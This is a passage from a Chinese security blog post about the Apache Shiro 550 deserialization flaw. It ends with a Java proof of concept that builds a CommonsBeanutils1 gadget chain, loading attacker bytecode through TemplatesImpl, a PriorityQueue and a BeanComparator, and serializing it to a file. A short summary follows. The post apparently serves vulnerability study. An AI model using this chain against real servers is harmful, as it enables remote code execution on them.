class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Codes\\Java\\javasec\\CC\\target\\classes\\pojo\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line">        <span class="comment">// 提前触发链条看效果，就要设置_tfactory</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"><span class="comment">//        templates.getOutputProperties();</span></span><br><span class="line"><span class="comment">//        PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line"><span class="comment">//        setFieldValue(beanComparator,&quot;property&quot;,&quot;outputProperties&quot;);</span></span><br><span class="line"><span class="comment">//        beanComparator.compare(templates,templates);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        // add会提前触发链条，这里选择先提前add，再统一传参</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(beanComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"><span class="comment">//        // 统一传参，防止链条被破坏</span></span><br><span class="line">        setFieldValue(priorityQueue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>[]&#123;templates,templates&#125;);</span><br><span class="line">        setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">       serialize(priorityQueue);</span><br><span class="line">        <span class="comment">// unserialize();</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(o);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//反序列化执行readObject()方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694003006742-1a409a1f-5c46-4f8e-a48a-8ee199c68567.png" alt="image.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>shiro550这个洞，就是反序列化套了一层AES加密，AES密钥已知的基础上，本质就是一个简单的反序列化漏洞。<br>感觉更多的是考察在Shiro的依赖条件下，要怎么RCE，通过这个洞学到了URLDNS、CC8、CB1三条链子。</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li>
        
          <li><a href="/links/">links</a></li>
        
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.</span> <span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%91%98%E8%A6%81"><span class="toc-number">3.1.</span> <span class="toc-text">摘要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%96%E6%B4%9E%E6%80%9D%E8%B7%AF"><span class="toc-number">3.2.</span> <span class="toc-text">挖洞思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#URLDNS"><span class="toc-number">4.1.</span> <span class="toc-text">URLDNS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC8"><span class="toc-number">4.2.</span> <span class="toc-text">CC8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CB1"><span class="toc-number">4.3.</span> <span class="toc-text">CB1</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jaspersec.top/2023/12/24/0x08%20Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jaspersec.top/2023/12/24/0x08%20Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=shiro550反序列化"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jaspersec.top/2023/12/24/0x08%20Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=shiro550反序列化"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jaspersec.top/2023/12/24/0x08%20Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=shiro550反序列化"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=shiro550反序列化&body=Check out this article: https://jaspersec.top/2023/12/24/0x08%20Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jaspersec.top/2023/12/24/0x08%20Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=shiro550反序列化"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jaspersec.top/2023/12/24/0x08%20Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=shiro550反序列化"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jaspersec.top/2023/12/24/0x08%20Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=shiro550反序列化"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jaspersec.top/2023/12/24/0x08%20Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=shiro550反序列化"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jaspersec.top/2023/12/24/0x08%20Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=shiro550反序列化&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jaspersec.top/2023/12/24/0x08%20Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=shiro550反序列化"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    Jasper_sec
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
      <ul>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        <span id="busuanzi_container_site_pv">
          本站总访问量 <span id="busuanzi_value_site_pv"></span>次
        </span>
        <span id="busuanzi_container_site_uv">
          本站访客数 <span id="busuanzi_value_site_uv"></span>人
        </span>
        <span id="busuanzi_container_page_uv">
          本页访问量 <span id="busuanzi_value_page_pv"><!-- number will be auto injected here by busuanzi --></span>次
        </span>
      </ul>
    </nav>
  </div>

</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?21e6754c7f372c2de41518ffb4f72c33";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
